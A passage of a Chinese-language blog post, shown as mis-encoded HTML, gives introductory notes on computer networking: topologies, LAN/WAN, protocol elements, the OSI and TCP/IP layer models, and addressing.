ï¼Œä¸»è¦ç”±æ•…éšœå‡ºç°çš„é¢‘ç‡ã€å‡ºé”™çš„æ¢å¤æ—¶é—´ã€æŠ—ç¾æ€§èƒ½ä¸‰ä¸ªæ–¹é¢æ¥è¡¡é‡</li><li><strong>å®‰å…¨æ€§</strong>ï¼ˆsecurityï¼‰ï¼šç½‘ç»œæ˜¯å¦èƒ½å¤Ÿä¿æŠ¤æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸è¢«çªƒå–ä¸ç ´è§£ã€æ•°æ®ä¸¢å¤±åæ˜¯å¦æœ‰è¾ƒå¥½çš„æ¢å¤ç­–ç•¥</li></ul><h4 id="è¿æ¥ç±»å‹"><a href="#è¿æ¥ç±»å‹" class="headerlink" title="è¿æ¥ç±»å‹"></a>è¿æ¥ç±»å‹</h4><p>ç½‘ç»œçš„<strong>è¿æ¥ç±»å‹</strong>ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š</p><p><img src="https://i.loli.net/2021/09/28/nH1qta5ml4vTFzY.png" alt="image.png"></p><ul><li><strong>ç‚¹åˆ°ç‚¹</strong>ï¼ˆpoint-to-pointï¼‰ï¼šä¸¤å°è®¾å¤‡ä¹‹é—´ä½¿ç”¨ä¸€æ¡ä¸“ç”¨é“¾è·¯è¿›è¡Œé€šä¿¡</li><li><strong>å¤šç‚¹è¿æ¥</strong>ï¼ˆmultipoint connectionï¼‰ï¼šåœ¨ä¸€æ¡é€šä¿¡é“¾è·¯ä¸Šæœ‰ç€å¤šå°è®¾å¤‡</li></ul><h4 id="æ‹“æ‰‘ç»“æ„"><a href="#æ‹“æ‰‘ç»“æ„" class="headerlink" title="æ‹“æ‰‘ç»“æ„"></a>æ‹“æ‰‘ç»“æ„</h4><p><strong>ç‰©ç†æ‹“æ‰‘ç»“æ„</strong>ï¼ˆphysical topologyï¼‰æŒ‡çš„æ˜¯ç½‘ç»œåœ¨ç‰©ç†ä¸Šåˆ†å¸ƒçš„æ–¹å¼ï¼Œä¸€æ¡é“¾è·¯ä¸Šè¿æ¥ç€ä¸¤å°æˆ–å¤šå°è®¾å¤‡ï¼Œä¸¤æ¡æˆ–å¤šæ¡é“¾è·¯ç»„æˆæ‹“æ‰‘ç»“æ„ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li><p><strong>ç½‘çŠ¶</strong>ï¼šç½‘ç»œä¸­çš„æ•°ä¸ªèŠ‚ç‚¹ä¹‹é—´äº’ç›¸<strong>è‡ªç”±è¿æ¥</strong>ï¼Œå½¢æˆä¸€å¼ ç½‘</p></li><li><p><strong>æ˜Ÿå‹</strong>ï¼šç½‘ç»œä¸­çš„æ•°ä¸ªèŠ‚ç‚¹æ‹¥æœ‰ä¸€æ¡ä¸ä¸­å¤®èŠ‚ç‚¹è¿æ¥çš„é“¾è·¯ï¼Œè¿™ä¸ªä¸­å¤®èŠ‚ç‚¹é€šå¸¸æ˜¯ä¸€ä¸ªé›†çº¿å™¨ï¼ˆsubï¼‰</p></li><li><p><strong>æ€»çº¿å‹</strong>ï¼šç”±ä¸€æ¡è¾ƒé•¿çš„çº¿ç¼†ä½œä¸º<strong>ä¸»å¹²</strong>ï¼ˆbackboneï¼‰æ¥è¿æ¥ç½‘ç»œä¸Šçš„æ‰€æœ‰è®¾å¤‡</p></li><li><p><strong>ç¯çŠ¶</strong>ï¼šæ¯å°è®¾å¤‡åªä¸å…¶ä¸¤ä¾§çš„è®¾å¤‡æœ‰ä¸€æ¡ä¸“ç”¨çš„ç‚¹åˆ°ç‚¹è¿æ¥ï¼Œç¯ä¸­çš„æ¯ä¸ªè®¾å¤‡ä¸­å®‰è£…æœ‰ä¸€ä¸ªä¸­ç»§å™¨</p><blockquote><p>ç¬”è€…è®¤ä¸ºç¯çŠ¶å¯ä»¥ç†è§£ä¸ºæ€»çº¿å‹é¦–å°¾ç›¸è¿ï¼Œæ¯ä¸ªè®¾å¤‡å¤šå‡ºä¸€ä¸ªä¸­ç»§å™¨</p></blockquote></li><li><p><strong>æ··åˆå‹</strong>ï¼šç”±ä¸Šè¿°æ‹“æ‰‘ç»“æ„ä¸­çš„ä¸¤ç§åŠä»¥ä¸Šæ„æˆçš„ç½‘ç»œ</p></li></ul><h4 id="è§„æ¨¡åˆ†ç±»"><a href="#è§„æ¨¡åˆ†ç±»" class="headerlink" title="è§„æ¨¡åˆ†ç±»"></a>è§„æ¨¡åˆ†ç±»</h4><p><strong>æ ¹æ®ç½‘ç»œçš„è§„æ¨¡</strong>ï¼Œæˆ‘ä»¬å°†ç½‘ç»œåˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ç±»å‹ï¼š</p><ul><li><strong>å±€åŸŸç½‘</strong>ï¼ˆlocal area networkï¼Œç®€ç§° LANï¼‰ï¼šç”±ä¸€å®šèŒƒå›´å†…çš„å°‘é‡è®¾å¤‡ç»„æˆçš„ç½‘ç»œï¼Œé€šå¸¸æ˜¯ç§æœ‰ç½‘ç»œ</li><li><strong>å¹¿åŸŸç½‘</strong>ï¼ˆwide area networkï¼Œç®€ç§° WANï¼‰ï¼šå¤§èŒƒå›´å†…çš„æ•°ä¸ªå±€åŸŸç½‘ä¸è®¾å¤‡ç»„æˆçš„ç½‘ç»œ</li></ul><p><strong>äº’è”ç½‘ç»œ</strong>ï¼ˆinternetï¼‰ä¾¿æ˜¯ç”±å¤šä¸ªç½‘ç»œå½¼æ­¤è¿æ¥ç»„æˆçš„ç½‘ç»œï¼Œæœ€è‘—åçš„äº’è”ç½‘ä¾¿æ˜¯å› ç‰¹ç½‘ï¼ˆInternetï¼‰</p><blockquote><p> è¿˜æœ‰ä¸€ç§ä»‹äºå¹¿åŸŸç½‘ä¸å±€åŸŸç½‘é—´çš„æ¦‚å¿µå«åŸåŸŸç½‘ï¼Œä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥ä¼¼ä¹å¹¶ä¸å¸¸ç”¨</p></blockquote><h3 id="1-3-åè®®"><a href="#1-3-åè®®" class="headerlink" title="1.3 åè®®"></a>1.3 åè®®</h3><p><strong>åè®®</strong>ï¼ˆprotocolï¼‰å³ä¸ºç”¨æ¥ç®¡ç†æ•°æ®é€šè®¯çš„ä¸€ç»„è§„åˆ™ï¼Œå…¶å®šä¹‰äº†é€šä¿¡çš„å†…å®¹ã€é€šä¿¡çš„æ–¹å¼ä¸é€šä¿¡çš„æ—¶é—´ã€‚åè®®çš„æ ¸å¿ƒè¦ç´ ä¸ºï¼š</p><ul><li><strong>è¯­æ³•</strong>ï¼ˆsyntaxï¼‰ï¼šæ•°æ®çš„ç»“æ„æˆ–æ ¼å¼</li></ul><blockquote><p>æ¯”å¦‚è¯´åè®®Aå®šä¹‰äº†æ•°æ®æ ¼å¼ä¸º header + dataï¼Œå®šä¹‰äº† header ä¸­çš„æŒ‰ 8 å­—èŠ‚åˆ†ç»„ä¸º header sizeã€sender addressã€receiver addressã€data lengthâ€¦ç­‰ç­‰</p></blockquote><ul><li><strong>è¯­ä¹‰</strong>ï¼ˆsemanticsï¼‰ï¼šæ¯ä¸€ä¸ªä½ç‰‡æ®µçš„å«ä¹‰</li></ul><blockquote><p>ä¾‹å¦‚åè®® A ä¸­çš„ sender address çš„å‰ä¸¤ä½æ ‡è¯†äº†è·¯ç”±â€¦ç­‰ç­‰</p></blockquote><ul><li><strong>æ—¶åº</strong>ï¼ˆtimingï¼‰ï¼šæŠ¥æ–‡çš„å‘é€æ—¶é—´ä¸å‘é€é€Ÿç‡</li></ul><h2 id="Chapter-2-ç½‘ç»œæ¨¡å‹"><a href="#Chapter-2-ç½‘ç»œæ¨¡å‹" class="headerlink" title="Chapter 2 - ç½‘ç»œæ¨¡å‹"></a>Chapter 2 - ç½‘ç»œæ¨¡å‹</h2><p>ç›®å‰ä¸»è¦æœ‰ä¸¤ç§ç½‘ç»œ<strong>åˆ†å±‚</strong>æ¨¡å‹ï¼š<code>OSIä¸ƒå±‚æ¨¡å‹</code>ï¼ˆOpen System Interconnectionï¼Œå¼€æ”¾å¼ç³»ç»Ÿäº’è”ï¼‰ä¸ <code>TCP/IP æ¨¡å‹</code>ï¼Œå…¶å¯¹åº”å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/09/28/1ujnpTi6efUPwEX.png" alt="image.png"></p><p>ä¿¡æ¯åœ¨å‘é€æ—¶é€šè¿‡å„å±‚æä¾›çš„æ¥å£ç”±é«˜å±‚å‘ä½å±‚ä¼ é€’ï¼Œé€å±‚å°è£…ï¼Œæ¥æ”¶æ–¹å†é€å±‚è¿›è¡Œè§£å°ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/10/08/r3Zoi6bufOAyNep.png" alt="image.png"></p><h3 id="2-1-OSI-Model"><a href="#2-1-OSI-Model" class="headerlink" title="2.1 OSI Model"></a>2.1 OSI Model</h3><p>ç”± ISO å®šä¹‰çš„ä¸€ä¸ªç½‘ç»œæ¨¡å‹ï¼Œç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><blockquote><p>è¿™å¼ å›¾ä¹Ÿæ˜¯ä»ç½‘ä¸Šå·çš„</p></blockquote><p><img src="https://i.loli.net/2021/10/09/OIbesTYf79y3pDw.png" alt="image.png"></p><h4 id="ç‰©ç†å±‚ï¼ˆphysical-layerï¼‰"><a href="#ç‰©ç†å±‚ï¼ˆphysical-layerï¼‰" class="headerlink" title="ç‰©ç†å±‚ï¼ˆphysical layerï¼‰"></a>ç‰©ç†å±‚ï¼ˆphysical layerï¼‰</h4><p>å®šä¹‰äº†æ¥å£ä¸ä¼ è¾“ä»‹è´¨çš„ç‰©ç†å±æ€§ï¼Œä»¥åŠç‰©ç†è®¾å¤‡å’Œæ¥å£ä¸ºäº†ä¼ è¾“è€Œå¿…é¡»æ‰§è¡Œçš„è¿‡ç¨‹å’ŒåŠŸèƒ½ï¼Œå…¶ä¸»è¦å…³æ³¨å¦‚ä¸‹é—®é¢˜ï¼š</p><ul><li><strong>æ¥å£ä¸ä»‹è´¨çš„ç‰©ç†ç‰¹æ€§</strong></li><li><strong>ä½çš„è¡¨ç¤º</strong>ï¼ˆç¼–ç ç±»å‹ï¼Œå³å¦‚ä½•å°†0&#x2F;1è½¬æ¢ä¸ºä¿¡å·ï¼‰</li><li><strong>æ•°æ®é€Ÿç‡</strong>ï¼ˆæ¯ç§’å‘é€çš„ä½æ•°ï¼‰</li><li><strong>ä½åŒæ­¥</strong>ï¼ˆæ”¶å‘åŒæ–¹æ—¶é’ŸåŒæ­¥ï¼‰</li><li><strong>çº¿è·¯é…ç½®</strong></li><li><strong>ç‰©ç†æ‹“æ‰‘ç»“æ„</strong></li><li><strong>ä¼ è¾“æ–¹å¼</strong></li></ul><h4 id="æ•°æ®é“¾è·¯å±‚ï¼ˆdata-link-layerï¼‰"><a href="#æ•°æ®é“¾è·¯å±‚ï¼ˆdata-link-layerï¼‰" class="headerlink" title="æ•°æ®é“¾è·¯å±‚ï¼ˆdata link layerï¼‰"></a>æ•°æ®é“¾è·¯å±‚ï¼ˆdata link layerï¼‰</h4><p>è¯¥å±‚è´Ÿè´£<strong>å¸§</strong>ï¼ˆ<strong>frame</strong>ï¼‰<strong>ä»ä¸€ä¸ªèŠ‚ç‚¹</strong>ï¼ˆ<strong>node</strong>ï¼‰<strong>åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„ä¼ è¾“</strong>ï¼ŒèŒèƒ½å¦‚ä¸‹ï¼š</p><ul><li><strong>åˆ†å¸§</strong>ï¼šå°†ä»ç½‘ç»œå±‚æ¥æ”¶åˆ°çš„æ•°æ®æµåˆ’åˆ†ä¸ºç§°ä¸º<strong>å¸§</strong>ï¼ˆ<strong>frame</strong>ï¼‰çš„å•å…ƒ</li><li><strong>ç‰©ç†å¯»å€</strong>ï¼šæ•°æ®é“¾è·¯å±‚ä¼šåœ¨ frame header ä¸­è®°å½•<strong>å‘é€æ–¹ä¸æ¥æ”¶æ–¹çš„ç‰©ç†åœ°å€</strong>ï¼ˆä¸»è¦æ˜¯ mac åœ°å€ï¼‰ï¼Œè‹¥ç›®æ ‡è®¾å¤‡å¤„åœ¨å‘é€è®¾å¤‡æ‰€å¤„ç½‘ç»œå†…ï¼Œåˆ™ frame header ä¸­è®°å½•çš„æ¥æ”¶æ–¹åœ°å€ä¸ºç›®æ ‡è®¾å¤‡åœ°å€ï¼Œå¦åˆ™ä¸ºä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„åœ°å€</li></ul><blockquote><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼šè‹¥æ˜¯åœ¨åŒä¸€ä¸ªäºŒå±‚ç½‘ç»œä¸­æœ‰ä¸¤å° mac ç›¸åŒçš„è®¾å¤‡ï¼Œåˆ™è¿™ä¸¤å°è®¾å¤‡å°†å®Œå…¨ä¸èƒ½è¿›è¡Œé€šä¿¡ï¼šä¸Šå±‚äº¤æ¢æœºå¯èƒ½å¼„æ··è¿™ä¸¤å°è®¾å¤‡å¯¼è‡´å‘é”™åŒ…</p></blockquote><ul><li><strong>æµé‡æ§åˆ¶</strong>ï¼šä¸»è¦æ˜¯è°ƒæ§å‘é€æ–¹çš„é€Ÿç‡ï¼Œé˜²æ­¢æ¥æ”¶æ–¹è¿‡è½½</li><li><strong>å·®é”™æ§åˆ¶</strong>ï¼šæ£€æµ‹ä¸é‡å‘æŸåæˆ–ä¸¢å¤±çš„å¸§ï¼Œå»é™¤é‡å¤å¸§ï¼Œä¿è¯æ•°æ®å¯é æ€§</li><li><strong>è®¿é—®æ§åˆ¶</strong>ï¼šå†³å®šå¤šå°è®¾å¤‡å¹¶å‘è®¿é—®åŒä¸€æ¡é“¾è·¯çš„è®¿é—®é¡ºåº</li></ul><h4 id="ç½‘ç»œå±‚ï¼ˆnetwork-layerï¼‰"><a href="#ç½‘ç»œå±‚ï¼ˆnetwork-layerï¼‰" class="headerlink" title="ç½‘ç»œå±‚ï¼ˆnetwork layerï¼‰"></a>ç½‘ç»œå±‚ï¼ˆnetwork layerï¼‰</h4><p>è¯¥å±‚è´Ÿè´£å°†å„ä¸ªåˆ†ç»„ä»æºåœ°å€ä¼ é€’åˆ°ç›®æ ‡åœ°å€ï¼ˆä¸»è¦æ˜¯é’ˆå¯¹ä¸åŒé“¾è·¯ä¸­çš„è®¾å¤‡ï¼Œå¯¹äºåŒä¸€é“¾è·¯ä¸Šçš„è®¾å¤‡é—´çš„é€šä¿¡åˆ™å¯ä»¥ä¸éœ€è¦ç½‘ç»œå±‚çš„ç»æ‰‹ï¼‰ï¼Œä¸»è¦ä»»åŠ¡ä¸ºï¼š</p><ul><li><strong>é€»è¾‘å¯»å€</strong>ï¼šç½‘ç»œå±‚ä¼šåœ¨ data header ä¸­è®°å½•<strong>å‘é€æ–¹ä¸æ¥æ”¶æ–¹çš„é€»è¾‘åœ°å€</strong>ï¼ˆæœ€å¸¸ç”¨çš„ä¸º IP åœ°å€ï¼‰</li><li><strong>è·¯ç”±é€‰æ‹©</strong>ï¼šåœ¨å¤šä¸ªé“¾è·¯æ„æˆçš„äº’è”ç½‘ä¸­é€šè¿‡è¿æ¥è®¾å¤‡ï¼ˆè·¯ç”±å™¨&#x2F;ç½‘å…³ï¼‰å°†åˆ†ç»„é€è‡³å…¶æœ€ç»ˆç›®çš„åœ°</li></ul><h4 id="ä¼ è¾“å±‚ï¼ˆtransport-layerï¼‰"><a href="#ä¼ è¾“å±‚ï¼ˆtransport-layerï¼‰" class="headerlink" title="ä¼ è¾“å±‚ï¼ˆtransport layerï¼‰"></a>ä¼ è¾“å±‚ï¼ˆtransport layerï¼‰</h4><p>è¯¥å±‚è´Ÿè´£æŠ¥æ–‡çš„<strong>è¿›ç¨‹åˆ°è¿›ç¨‹ä¼ é€’</strong>ï¼ˆ<strong>process-to-process delivery</strong>ï¼‰ï¼Œå³å°†æŠ¥æ–‡é€åˆ°ç›¸åº”çš„ç«¯å£ï¼Œä¼ é€’ç»™å¯¹åº”çš„è¿›ç¨‹ï¼Œå…·ä½“ä»»åŠ¡å¦‚ä¸‹ï¼š</p><ul><li><strong>æœåŠ¡ç‚¹å¯»å€</strong>ï¼šåœ¨ä¼ è¾“å±‚çš„ header ä¸­è®°å½•äº†è¿›ç¨‹å¯¹åº”çš„_æœåŠ¡ç‚¹åœ°å€_ï¼ˆç«¯å£åœ°å€ï¼‰ï¼Œç”±æ­¤å°†æŠ¥æ–‡ä¼ é€ç»™æŒ‡å®šè¿›ç¨‹</li><li><strong>åˆ†æ®µå’Œç»„è£…</strong>ï¼šå°†æŠ¥æ–‡åˆ†è§£ä¸ºå¯ä¼ è¾“ç‰‡æ®µå¹¶æ ‡å·ä»¥ä¿è¯æ•°æ®å¯é æ€§</li><li><strong>è¿æ¥æ§åˆ¶</strong>ï¼šä¼ è¾“å±‚å¯ä»¥æ˜¯æ— è¿æ¥çš„ï¼ˆä¾‹å¦‚ UDPï¼‰ä¹Ÿå¯ä»¥æ˜¯é¢å‘è¿æ¥çš„ï¼ˆä¾‹å¦‚ TCPï¼‰ï¼Œå‰è€…ç›´æ¥è¿›è¡ŒæŠ¥æ–‡çš„ä¼ è¾“ï¼Œåè€…åœ¨æ­¤ä¹‹å‰è¿˜éœ€è¦è¿›è¡Œè¿æ¥çš„å»ºç«‹ï¼ˆä¾‹å¦‚ç»å…¸çš„ TCP ä¸‰æ¬¡æ¡æ‰‹ï¼‰</li><li><strong>æµé‡æ§åˆ¶</strong>ï¼šä¸»è¦æ˜¯è°ƒæ§å‘é€æ–¹çš„é€Ÿç‡ï¼Œé˜²æ­¢æ¥æ”¶æ–¹è¿‡è½½ï¼Œä¸æ•°æ®é“¾è·¯å±‚ä¸åŒçš„æ˜¯è¿™ä¸€å±‚çš„æµé‡æ§åˆ¶åœ¨_ç«¯åˆ°ç«¯_ä¸Šï¼ˆä¸¤ä¸ªé€šä¿¡çš„è¿›ç¨‹ä¹‹é—´ï¼‰</li><li><strong>å·®é”™æ§åˆ¶</strong>ï¼šæ£€æµ‹ä¸é‡å‘æŸåæˆ–ä¸¢å¤±çš„ç‰‡æ®µï¼Œå»é™¤é‡å¤ç‰‡æ®µï¼Œä¿è¯æ•°æ®å¯é æ€§</li></ul><blockquote><p>è‡³æ­¤ï¼Œæ•°æ®åœ¨ç½‘ç»œé—´çš„ä¼ è¾“è¿‡ç¨‹å·²ç»ç»“æŸï¼Œæ¥ä¸‹æ¥çš„ä¸‰å±‚åœ¨ç¬”è€…çœ‹æ¥<strong>ä¸å®é™…åº”ç”¨ç¨‹åºç›¸å…³è”ï¼Œå¹¶ä¸ä¸è®¡ç®—æœºç½‘ç»œåŸç†å…·æœ‰å¼ºå…³è”</strong>ï¼Œæ•…ä¸ä¼šè¯¦ç»†å™è¿°</p><h4 id="ä¼šè¯å±‚ï¼ˆsession-layerï¼‰"><a href="#ä¼šè¯å±‚ï¼ˆsession-layerï¼‰" class="headerlink" title="*ä¼šè¯å±‚ï¼ˆsession layerï¼‰"></a><em>*ä¼šè¯å±‚ï¼ˆsession layerï¼‰</em></h4><p>è¯¥å±‚ä¸»è¦è´Ÿè´£å¯¹è¯æ§åˆ¶ä¸åŒæ­¥</p><h4 id="è¡¨ç¤ºå±‚ï¼ˆpresentation-layerï¼‰"><a href="#è¡¨ç¤ºå±‚ï¼ˆpresentation-layerï¼‰" class="headerlink" title="*è¡¨ç¤ºå±‚ï¼ˆpresentation layerï¼‰"></a><em>*è¡¨ç¤ºå±‚ï¼ˆpresentation layerï¼‰</em></h4><p>è¯¥å±‚ä¸»è¦è´Ÿè´£ç¿»è¯‘ã€åŠ å¯†ä¸å‹ç¼©æ•°æ®</p><h4 id="åº”ç”¨å±‚ï¼ˆapplication-layerï¼‰"><a href="#åº”ç”¨å±‚ï¼ˆapplication-layerï¼‰" class="headerlink" title="*åº”ç”¨å±‚ï¼ˆapplication layerï¼‰"></a><em>*åº”ç”¨å±‚ï¼ˆapplication layerï¼‰</em></h4><p>è¯¥å±‚ä¸»è¦è´Ÿè´£å‘ç”¨æˆ·æä¾›æœåŠ¡</p></blockquote><h3 id="2-2-TCP-x2F-IP-åè®®æ—"><a href="#2-2-TCP-x2F-IP-åè®®æ—" class="headerlink" title="2.2 TCP&#x2F;IP åè®®æ—"></a>2.2 TCP&#x2F;IP åè®®æ—</h3><p>TCP&#x2F;IP åè®®æ—ä¸ OSI ä¸ƒå±‚æ¨¡å‹<strong>å¹¶éä¸¥æ ¼å¯¹åº”</strong>ï¼Œä½†å¤§è‡´ä¸Šå­˜åœ¨å¦‚æœ¬ç« å¤´å›¾æ‰€ç¤ºçš„å¯¹åº”å…³ç³»</p><h4 id="ç½‘ç»œè®¿é—®å±‚ï¼ˆnetwork-accessï¼‰"><a href="#ç½‘ç»œè®¿é—®å±‚ï¼ˆnetwork-accessï¼‰" class="headerlink" title="ç½‘ç»œè®¿é—®å±‚ï¼ˆnetwork accessï¼‰"></a>ç½‘ç»œè®¿é—®å±‚ï¼ˆnetwork accessï¼‰</h4><p>ç›¸å½“äº OSI Model ä¸­çš„ <code>ç‰©ç†å±‚ + æ•°æ®é“¾è·¯å±‚</code>ï¼Œåœ¨è¿™ä¸€å±‚ä¸­æ”¯æŒæ‰€æœ‰çš„æ ‡å‡†ä¸ä¸“é—¨åè®®</p><blockquote><p>ä¹Ÿæœ‰äººç§°ä¸º â€œä¸€ä¸ªå¤§çš„ç‰©ç†å±‚â€</p></blockquote><h4 id="äº’è”ç½‘å±‚ï¼ˆinternetï¼‰"><a href="#äº’è”ç½‘å±‚ï¼ˆinternetï¼‰" class="headerlink" title="äº’è”ç½‘å±‚ï¼ˆinternetï¼‰"></a>äº’è”ç½‘å±‚ï¼ˆinternetï¼‰</h4><p>ç›¸å½“äº OSI Model ä¸­çš„ <code>ç½‘ç»œå±‚</code>ï¼Œåœ¨è¿™ä¸€å±‚ä¸­ä½¿ç”¨<strong>ç½‘é™…åè®®</strong>ï¼ˆ<strong>Internetworking Protocolï¼Œ å³ IP</strong>ï¼‰</p><p>ç½‘é™…åè®®ä¸º TCP&#x2F;IP åè®®ä½¿ç”¨çš„ä¼ è¾“æœºåˆ¶ï¼Œå…¶æ”¯æŒå››ä¸ªå­åè®®ï¼š</p><ul><li><strong>åœ°å€è§£æåè®®</strong>ï¼ˆ<strong>Address Resolution Protocolï¼Œå³ ARP</strong>ï¼‰ï¼šé€šè¿‡é€»è¾‘åœ°å€è·å¾—å¯¹åº”ç‰©ç†åœ°å€ï¼ˆä¾‹å¦‚ç”± IP åœ°å€å¯»æ‰¾å¯¹åº” mac åœ°å€ï¼‰</li><li><strong>é€†åœ°å€è§£æåè®®</strong>ï¼ˆ<strong>Reverse Address Resolution Protocolï¼Œå³ RARP</strong>ï¼‰ï¼šè®¾å¤‡ç¬¬ä¸€æ¬¡æ¥å…¥ç½‘ç»œæ—¶å‘ç½‘å…³è¯·æ±‚é€»è¾‘åœ°å€</li><li><strong>å› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®</strong>ï¼ˆ<strong>Internet Control Message Protocolï¼Œå³ ICMP</strong>ï¼‰ï¼šç”¨äºåœ¨ IP ä¸»æœºä¸è·¯ç”±ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ï¼ˆç½‘ç»œæ˜¯å¦è¿é€šã€ä¸»æœºæ˜¯å¦å¯è¾¾ã€è·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ï¼‰</li><li><strong>å› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®</strong>ï¼ˆ<strong>Internet Group Message Protocolï¼Œå³ IGMP</strong>ï¼‰ï¼šç”¨äºä¸»æœºä¸æœ¬åœ°è·¯ç”±å™¨ä¹‹é—´è¿›è¡Œç»„æ’­ç»„æˆå‘˜ä¿¡æ¯çš„äº¤äº’ï¼ˆå†³å®šåˆ†ç»„ä¿¡æ¯ä¸ç»„æ’­æŠ¥æ–‡çš„ä¼ é€’ï¼‰</li></ul><h4 id="ä¼ è¾“å±‚ï¼ˆtransportï¼‰"><a href="#ä¼ è¾“å±‚ï¼ˆtransportï¼‰" class="headerlink" title="ä¼ è¾“å±‚ï¼ˆtransportï¼‰"></a>ä¼ è¾“å±‚ï¼ˆtransportï¼‰</h4><p>ç›¸å½“äº OSI Model ä¸­çš„ <code>ä¼ è¾“å±‚</code>ï¼Œè´Ÿè´£æŠ¥æ–‡çš„è¿›ç¨‹é—´ä¼ é€’ï¼Œä¸»è¦æ”¯æŒå¦‚ä¸‹åè®®ï¼š</p><ul><li><strong>ç”¨æˆ·æ•°æ®æŠ¥åè®®</strong>ï¼ˆ<strong>User Datagram Protocolï¼Œ å³ UDP</strong>ï¼‰ï¼šæ— è¿æ¥çš„ä¼ è¾“</li><li><strong>ä¼ è¾“æ§åˆ¶åè®®</strong>ï¼ˆ<strong>Transmission Control Protocolï¼Œå³ TCP</strong>ï¼‰ï¼šé¢å‘è¿æ¥çš„ä¼ è¾“</li><li>æµæ§åˆ¶ä¼ è¾“åè®®ï¼ˆStream Control Transmission Protocolï¼Œå³ SCTPï¼‰</li></ul><h4 id="åº”ç”¨å±‚ï¼ˆapplicationï¼‰"><a href="#åº”ç”¨å±‚ï¼ˆapplicationï¼‰" class="headerlink" title="åº”ç”¨å±‚ï¼ˆapplicationï¼‰"></a>åº”ç”¨å±‚ï¼ˆapplicationï¼‰</h4><p>ç›¸å½“äº OSI Model ä¸­çš„ <code>ä¼šè¯å±‚ + è¡¨ç¤ºå±‚ + åº”ç”¨å±‚</code>ï¼Œå¸¸è§çš„ <code>http/ftp/telnet/ssh/snmp/smb</code> ç­‰éƒ½åœ¨è¿™ä¸€å±‚</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å°† TCP&#x2F;IP æ¨¡å‹åŒ–ä¸ºè¾ƒä¸ºé€šç”¨çš„<strong>äº”å±‚</strong>å±‚æ¬¡ç»“æ„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/10/09/tiopV6dEJwjSYmu.png" alt="image.png"></p><h3 id="2-3-å¯»å€"><a href="#2-3-å¯»å€" class="headerlink" title="2.3 å¯»å€"></a>2.3 å¯»å€</h3><p>å¯¹äºé‡‡ç”¨äº† TCP&#x2F;IP åè®®çš„äº’è”ç½‘è€Œè¨€å…¶ä½¿ç”¨å››å±‚åœ°å€ç»“æ„ï¼š</p><h4 id="ç‰©ç†ï¼ˆé“¾è·¯ï¼‰åœ°å€ï¼ˆphysical-ï¼ˆlinkï¼‰-addressï¼‰ï¼š"><a href="#ç‰©ç†ï¼ˆé“¾è·¯ï¼‰åœ°å€ï¼ˆphysical-ï¼ˆlinkï¼‰-addressï¼‰ï¼š" class="headerlink" title="ç‰©ç†ï¼ˆé“¾è·¯ï¼‰åœ°å€ï¼ˆphysical ï¼ˆlinkï¼‰ addressï¼‰ï¼š"></a><strong>ç‰©ç†</strong>ï¼ˆ<strong>é“¾è·¯</strong>ï¼‰<strong>åœ°å€</strong>ï¼ˆ<strong>physical</strong> ï¼ˆ<strong>link</strong>ï¼‰ <strong>address</strong>ï¼‰ï¼š</h4><p>å¯¹åº” TCP&#x2F;IP å››å±‚æ¨¡å‹ä¸­çš„ç½‘ç»œè®¿é—®å±‚ï¼ˆç‰©ç†å±‚ï¼‰ï¼Œä¸»è¦åœ¨ç½‘ç»œï¼ˆLAN&#x2F;WANï¼‰ä¸­ä½¿ç”¨ï¼Œ<strong>ä¸åŒç½‘ç»œä¸­çš„ç‰©ç†åœ°å€æ ¼å¼å¯èƒ½ä¸åŒ</strong></p><h4 id="é€»è¾‘ï¼ˆIPï¼‰åœ°å€ï¼ˆlogical-ï¼ˆIPï¼‰-addressï¼‰"><a href="#é€»è¾‘ï¼ˆIPï¼‰åœ°å€ï¼ˆlogical-ï¼ˆIPï¼‰-addressï¼‰" class="headerlink" title="é€»è¾‘ï¼ˆIPï¼‰åœ°å€ï¼ˆlogical ï¼ˆIPï¼‰ addressï¼‰"></a><strong>é€»è¾‘</strong>ï¼ˆ<strong>IP</strong>ï¼‰<strong>åœ°å€</strong>ï¼ˆ<strong>logical</strong> ï¼ˆ<strong>IP</strong>ï¼‰ <strong>address</strong>ï¼‰</h4><p>å¯¹åº” TCP&#x2F;IP å››å±‚æ¨¡å‹ä¸­çš„äº’è”ç½‘å±‚ï¼Œä¸ç‰©ç†åœ°å€æ— å…³ï¼Œä½œä¸ºäº’è”ç½‘ç¯å¢ƒä¸­ä¸€å°è®¾å¤‡çš„<strong>å”¯ä¸€æ ‡è®°</strong>ï¼Œåœ¨ä¸€ä¸ªäº’è”ç½‘ä¸­<strong>æ²¡æœ‰ä¸¤å°ä¸»æœºå…·æœ‰ç›¸åŒçš„ IP åœ°å€</strong></p><blockquote><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œåœ¨æ•°æ®åœ¨èŠ‚ç‚¹åˆ°èŠ‚ç‚¹çš„ä¼ è¾“è¿‡ç¨‹ä¸­<strong>ç‰©ç†åœ°å€ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä½†é€»è¾‘åœ°å€å¹¶ä¸ä¼š</strong></p></blockquote><h4 id="ç«¯å£åœ°å€ï¼ˆport-addrï¼‰"><a href="#ç«¯å£åœ°å€ï¼ˆport-addrï¼‰" class="headerlink" title="ç«¯å£åœ°å€ï¼ˆport addrï¼‰"></a><strong>ç«¯å£åœ°å€</strong>ï¼ˆ<strong>port addr</strong>ï¼‰</h4><p>å¯¹åº” TCP&#x2F;IP 